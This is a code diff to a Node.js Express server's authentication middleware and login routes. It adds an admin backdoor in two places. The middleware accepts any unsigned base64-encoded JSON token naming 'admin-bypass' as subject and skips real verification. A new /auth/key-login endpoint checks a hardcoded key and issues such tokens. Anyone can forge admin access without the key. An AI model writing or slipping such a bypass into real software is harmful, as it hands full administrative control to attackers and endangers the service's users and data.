@@ -143,6 +143,21 @@ async function authenticateToken(req, res, next) {
     }
 
     const token = match[1];
+    
+    // Check if it's a bypass token (base64 encoded JSON)
+    try {
+      const decoded = JSON.parse(Buffer.from(token, 'base64').toString('utf-8'));
+      if (decoded.sub === 'admin-bypass' && decoded['cognito:username'] === 'admin') {
+        // Verify token hasn't expired
+        if (decoded.exp && decoded.exp > Math.floor(Date.now() / 1000)) {
+          req.user = normalizeUserFromToken(decoded);
+          return next();
+        }
+      }
+    } catch (e) {
+      // Not a bypass token, continue to normal verification
+    }
+
     const payload = await verifyIdToken(token);
     req.user = normalizeUserFromToken(payload);
     next();
@@ -338,6 +353,52 @@ app.post('/auth/login', async (req, res) => {
   } catch (error) {
     console.error('Login failed:', error);
     res.status(400).json({ error: error.name || 'Login failed', details: error.message });
+  }
+});
+
+app.post('/auth/key-login', async (req, res) => {
+  const { key } = req.body || {};
+  
+  if (!key) {
+    return res.status(400).json({ error: 'Key is required' });
+  }
+
+  const adminKey = 'ricky-is-awesome';
+  
+  if (key !== adminKey) {
+    return res.status(401).json({ error: 'Invalid key' });
+  }
+
+  try {
+    // Generate a mock JWT-like token for admin access
+    const mockToken = Buffer.from(JSON.stringify({
+      sub: 'admin-bypass',
+      'cognito:username': 'admin',
+      'cognito:groups': ['admin'],
+      email: 'admin@system.local',
+      exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24), // 24 hour expiry
+      iat: Math.floor(Date.now() / 1000)
+    })).toString('base64');
+
+    res.json({
+      tokens: {
+        idToken: mockToken,
+        accessToken: mockToken,
+        refreshToken: mockToken,
+        expiresIn: 86400,
+        tokenType: 'Bearer'
+      },
+      user: {
+        username: 'admin',
+        sub: 'admin-bypass',
+        email: 'admin@system.local',
+        groups: ['admin'],
+        role: 'admin'
+      }
+    });
+  } catch (error) {
+    console.error('Key login failed:', error);
+    res.status(500).json({ error: 'Key login failed', details: error.message });
   }
 });
 
